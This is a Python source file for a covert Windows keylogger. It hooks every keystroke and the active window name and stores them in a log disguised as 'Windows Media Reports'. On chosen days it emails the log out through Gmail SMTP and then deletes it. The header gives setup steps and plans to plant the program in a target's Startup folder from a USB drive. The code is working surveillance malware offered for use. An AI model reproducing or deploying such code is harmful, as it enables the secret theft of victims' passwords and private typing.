#######################"""How to use"""###############################
# Edit line 39,40,41 to send the email to yourself - has to be gmail #
# convert the file into an executable                                #
# install the require libraries                                      #
####################################3#################################


"""
								Note
- C:\\Users\\userName\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup

								To Do
- Create a bash or python script that moves the files from usb to startup folder of target

								Bugs 
- All letters are caplitlized
- Numbers are printed because we ignored non-english characters

"""
# windows handling 
import pyHook, pythoncom, os
# get user's name
import getpass
# email handling
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime # get current date
from pathlib import Path # get user's name so we can go to the directory

# current day
todays_number = datetime.today().day # returns which day it is in the month
todays_date = datetime.now().strftime('%Y-%b-%d') # returns Year-Month-Day string format
whenToSend = [1,7,14,28] # an array for days of the month to know whne to send :: editable

# Email credentials for Google to specify where you send from and to :: editable
emailUser = 'your@gmail.com'
emailSend = 'your@gmail.com'
password = 'YourPassword'
subject = getpass.getuser() + " " + todays_date # used for subject of email format :: editable

# get's the current user's home directory 
# returns C:\Users\NameOfUser
home = str(Path.home())

# where to create new folder :: editable
newFolderDir = home + '\\Documents\\Windows Media Reports\\' 
fileName = "MediaReport.txt"
fileDirectory = home + '\\Documents\\Windows Media Reports\\' + fileName


# Email function
###########################################################################
def send_email(date):
	if(date in whenToSend):
		if(os.path.isfile(fileDirectory)):
			# Message setup
			msg = MIMEMultipart()
			msg['From'] = emailUser
			msg['To'] = emailSend
			msg['Subject'] = subject

			body = 'Another one'
			msg.attach(MIMEText(body,'plain'))

			# Here we are sending multiple files 
			# ** look at all files in the directory, attach them, send, and delete

			attachment = open(fileDirectory, 'rb')

			part = MIMEBase('application', 'octet-stream')
			part.set_payload((attachment).read())
			encoders.encode_base64(part)
			part.add_header('Content-Disposition', "attachment; filename= " + fileDirectory)

			msg.attach(part)
			text = msg.as_string()
			server = smtplib.SMTP('smtp.gmail.com', 587)
			server.starttls()
			server.login(emailUser, password)

			server.sendmail(emailUser,emailSend,text)
			server.quit()
			attachment.close()
			# now you need to delete the files after this line
			os.remove(fileDirectory)

###########################################################################

# Beginning of the Key Logger

line_buffer = "" #current typed line before return character
window_name = "" #current window

# C:\Users\NameOfUser\Document\Windows Media Reports\
# create the folder for where the log docs will go 
def create_Directory():
    if not os.path.exists(newFolderDir):
        os.makedirs(newFolderDir)

# save the buffer to the file
def SaveLineToFile(line):
    todays_file = open(fileDirectory, 'a') #open todays file (append mode)
    todays_file.write(line) #append line to file
    todays_file.close() #close todays file

# record the user's strokes
def OnKeyboardEvent(event):
    global line_buffer
    global window_name
    #print 'Ascii:', event.KeyID, chr(event.KeyID) #pressed value

    """if typing in new window"""
    if(window_name != event.WindowName): #if typing in new window
        if(line_buffer != ""): #if line buffer is not empty
            line_buffer += '\n'
            SaveLineToFile(line_buffer) #print to file: any non printed characters from old window

        line_buffer = "" #clear the line buffer
        SaveLineToFile('\n-----WindowName: ' + event.WindowName + '\n') #print to file: the new window name
        window_name = event.WindowName #set the new window name

    """if return or tab key pressed"""
    if(event.KeyID == 13 or event.KeyID == 9): #return key
        line_buffer += '\n'
        SaveLineToFile(line_buffer) #print to file: the line buffer
        line_buffer = "" #clear the line buffer
        return True #exit event

    """if backspace key pressed"""
    if(event.KeyID == 8): #backspace key
        line_buffer = line_buffer[:-1] #remove last character
        return True #exit event

    """if non-normal ascii character"""
    if(event.KeyID < 32 or event.KeyID > 126):
        if(event.KeyID == 0): #unknown character (eg arrow key, shift, ctrl, alt)
            pass #do nothing
        else:
            if(event.KeyID == 190):
                line_buffer = line_buffer + '.'
            elif(event.KeyID == 164):
            	pass # do nothing when tab is pressed 
            else:
                line_buffer = line_buffer + str(event.KeyID) + '\n'
    else:
        line_buffer += chr(event.KeyID) #add pressed character to line buffer
        
    return True #pass event to other handlers
###########################################################################

#creates the directory
try: 
	send_email(todays_number)
except:
	print("No internet")
create_Directory()


hooks_manager = pyHook.HookManager() #create hook manager
hooks_manager.KeyDown = OnKeyboardEvent #watch for key press
hooks_manager.HookKeyboard() #set the hook
pythoncom.PumpMessages() #wait for events﻿

